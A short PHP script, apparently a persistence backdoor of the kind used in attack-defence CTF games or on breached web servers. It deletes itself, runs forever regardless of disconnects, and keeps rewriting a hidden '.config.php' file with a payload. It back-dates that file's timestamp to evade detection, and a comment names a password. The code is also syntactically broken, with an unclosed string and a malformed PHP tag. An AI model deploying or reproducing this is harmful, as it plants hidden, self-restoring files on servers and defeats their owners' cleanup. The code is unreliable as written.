
<?php
    ignore_user_abort(true);
    set_time_limit(0);
    unlink(__FILE__);
    $file = '.config.php';
    $code = '<php? echo"kill you!" ?>;
    //pass=pass
    while (1){
        file_put_contents($file,$code);
        system('touch -m -d "2022-10-14 09:10:12" .config.php');
        usleep(100);
    }
?>
